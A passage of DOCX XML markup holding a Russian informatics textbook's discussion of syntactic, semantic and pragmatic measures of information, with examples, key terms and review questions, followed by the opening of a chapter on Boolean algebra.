      </w:pPr>
      <w:r>
        <w:t>**Очень высокая прагматическая ценность** (решение о продаже, прибыль)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для инвестора с другим портфелем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкая прагматическая ценность**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для человека, не занимающегося инвестициями:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нулевая прагматическая ценность**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 15:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Медицинская информация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация: "Препарат А эффективен против заболевания Б"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для больного с заболеванием Б:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Критически высокая прагматическая ценность** (может спасти жизнь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для врача, лечащего это заболевание:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая прагматическая ценность** (улучшит лечение пациентов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для здорового человека:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкая прагматическая ценность** (может пригодиться в будущем)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 16:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Срочность информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация: "Завтра экзамен перенесён на следующую неделю"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Получена за день до экзамена:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Очень высокая прагматическая ценность** (можно лучше подготовиться)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Получена через неделю после экзамена:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нулевая прагматическая ценность** (устарела)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 17:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Информация для принятия решений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Предприниматель выбирает между двумя проектами A и B.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация: "Рынок для проекта A сокращается на 20% ежегодно"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прагматическая ценность:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Очень высокая: влияет на выбор проекта, может предотвратить убытки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позволяет избежать неверного решения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без этой информации вероятность успеха: 50% (случайный выбор)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>С этой информацией вероятность успеха: 80% (осознанный выбор проекта B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прагматическая мера: Ip = 0.8 - 0.5 = 0.3 (или 30%)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение трёх мер информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Общая таблица сравнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Аспект               | Синтаксическая мера      | Семантическая мера       | Прагматическая мера      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------------------|--------------------------|--------------------------|--------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что измеряет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     | Количество символов/битов | Смысл, новизна           | Полезность, ценность     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зависит от</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Объём данных, кодировка   | Знания получателя        | Цели получателя          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Одинакова для всех</w:t>
      </w:r>
      <w:r>
        <w:t>| Да                       | Нет                      | Нет                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Хранение, передача        | Обучение, коммуникация   | Принятие решений         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Измеримость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Легко (биты, байты)       | Сложно (субъективно)     | Очень сложно             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример единиц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Биты, байты, КБ, МБ       | Относительная шкала      | Относительная шкала      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример сравнения на одном сообщении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сообщение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Температура процессора 95°C" (200 бит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксическая мера:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>25 символов × 8 бит = 200 бит = 25 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одинакова для всех получателей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Семантическая мера:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для программиста: высокая (понимает значение и последствия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для ребёнка: низкая (не понимает контекста)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для инженера, уже знающего температуру: нулевая (нет новизны)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прагматическая мера:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для владельца компьютера: очень высокая (перегрев, нужно действовать срочно!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для человека без компьютера: нулевая</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для инженера другого компьютера: нулевая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взаимосвязь трёх мер</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Три меры информации не противоречат, а дополняют друг друга:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Синтаксическая → Семантическая → Прагматическая</w:t>
        <w:br/>
        <w:t xml:space="preserve">   (основа)         (понимание)       (применение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Синтаксическая мера** — необходимая база: без физического носителя информации нет ни смысла, ни пользы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Семантическая мера** — добавляет понимание: бессмысленные данные не могут быть полезны</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прагматическая мера** — венчает пирамиду: даже понятная информация бесполезна, если не применима к целям</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическая значимость и применение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Применение синтаксической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В технических системах:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расчёт ёмкости носителей (жёсткие диски, SSD, оперативная память)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценка скорости передачи данных (Мбит/с)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расчёт пропускной способности каналов связи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация алгоритмов сжатия (глава 1.12)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формулы для расчёта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Время передачи = Размер данных / Скорость канала</w:t>
        <w:br/>
        <w:t>Объём хранилища = Количество файлов × Средний размер файла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Применение семантической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В системах обработки информации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поисковые системы (релевантность документов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы рекомендаций (персонализация контента)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Образовательные системы (адаптация материала под уровень ученика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фильтрация спама (отделение полезных сообщений от мусора)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Методы оценки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Анализ тезауруса пользователя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Учёт контекста и истории взаимодействий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Машинное обучение для оценки релевантности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Применение прагматической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В системах поддержки принятия решений:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бизнес-аналитика (BI-системы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медицинские диагностические системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Финансовые аналитические системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы управления производством</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критерии оценки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Влияние на ключевые показатели (KPI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ROI (возврат инвестиций) от использования информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Своевременность предоставления информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность и достоверность данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практический пример: организация информации на сайте</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксический уровень:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация размера веб-страниц для быстрой загрузки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие изображений и скриптов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использование эффективных кодировок (UTF-8)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Семантический уровень:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Структурирование контента для понятности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использование понятной терминологии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адаптация контента под аудиторию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SEO-оптимизация (поисковые системы понимают содержание)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прагматический уровень:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размещение важной информации на видных местах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Персонализация контента под нужды пользователя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рекомендации релевантных товаров/статей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Call-to-action кнопки в нужных местах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — минимальная единица измерения информации, соответствующая выбору из двух равновероятных вариантов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Байт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — единица информации, равная 8 битам</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула Хартли</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — формула для расчёта количества информации при равновероятных событиях: I = log₂(N)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула Шеннона</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — формула для расчёта энтропии (среднего количества информации) при неравновероятных событиях: H = -∑(pᵢ × log₂(pᵢ))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Энтропия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мера неопределённости источника информации, среднее количество информации на символ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количественная мера, учитывающая только объём данных в битах/байтах, независимо от смысла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Семантическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мера, учитывающая смысловое содержание, новизну и понятность информации для получателя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прагматическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мера, учитывающая полезность и ценность информации для достижения целей получателя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тезаурус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — совокупность знаний получателя в предметной области, влияющая на семантическую ценность информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационная ценность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — степень полезности информации для достижения целей и принятия решений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теоретический вопрос:** Объясните разницу между тремя мерами информации: синтаксической, семантической и прагматической. Приведите пример одного и того же сообщения, которое имеет разную ценность с точки зрения каждой из этих мер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача (формула Хартли):** В базе данных хранятся записи о студентах. Каждая запись содержит: номер группы (32 варианта), фамилию (выбор из справочника 1024 фамилий), оценку (5 вариантов). Рассчитайте количество информации в каждом поле и общее количество информации в записи о студенте.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача (формула Шеннона):** Источник генерирует четыре символа с вероятностями: A (0.4), B (0.3), C (0.2), D (0.1). Рассчитайте энтропию источника. Сравните полученное значение с энтропией для четырёх равновероятных символов. Объясните разницу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ ситуации:** Вы получили электронное письмо с информацией о предстоящей конференции по информационным технологиям. Проанализируйте прагматическую ценность этого письма для: а) студента-программиста, б) преподавателя информатики, в) пенсионера, не работающего в IT-сфере. Обоснуйте различия в прагматической ценности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическое применение:** Объясните, почему знание о разных мерах информации важно при разработке: а) системы резервного копирования данных, б) образовательной онлайн-платформы, в) системы бизнес-аналитики. Какая мера наиболее важна в каждом случае и почему?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данная глава раскрыла фундаментальные подходы к измерению информации.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Понимание синтаксической, семантической и прагматической мер критически важно для эффективной работы с информацией в любой области деятельности. В следующих главах мы продолжим изучение свойств информации и способов её обработки, опираясь на полученные знания о том, как можно количественно и качественно оценивать информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.6: Основы алгебры высказываний. Логические операции. Порядок логических операций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Алгебра высказываний (также называемая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>булевой алгеброй</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгеброй логики</w:t>
      </w:r>
      <w:r>
        <w:t>) — это раздел математической логики, изучающий логические операции над высказываниями. Названа в честь английского математика Джорджа Буля (1815-1864), который в 1854 году заложил основы этой науки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгебра высказываний является фундаментом для:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проектирования цифровых схем** — все процессоры, микросхемы памяти и другие электронные компоненты построены на логических элементах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Программирования** — условные операторы (if, while) используют логические выражения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Баз данных** — запросы содержат логические условия (WHERE, AND, OR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Искусственного интеллекта** — системы принятия решений основаны на логике</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Поисковых систем** — сложные запросы формируются с помощью логических операций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.1 (арифметика в двоичной системе), поскольку логические операции — это основа работы с двоичными данными. Также материал этой главы понадобится при изучении программирования (раздел 6) и баз данных (раздел 7).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание логики критически важно для любого специалиста в области информационных технологий. Умение строить и анализировать логические выражения — базовый навык, который применяется ежедневно в работе программиста, системного аналитика, разработчика аппаратного обеспечения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия алгебры высказываний</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Понятие высказывания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высказывание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это повествовательное предложение, о котором можно однозначно сказать, истинно оно или ложно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые характеристики высказывания:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Это должно быть утверждение (а не вопрос, восклицание или приказ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Оно должно быть либо истинным, либо ложным (принцип двузначности)</w:t>
      </w:r>
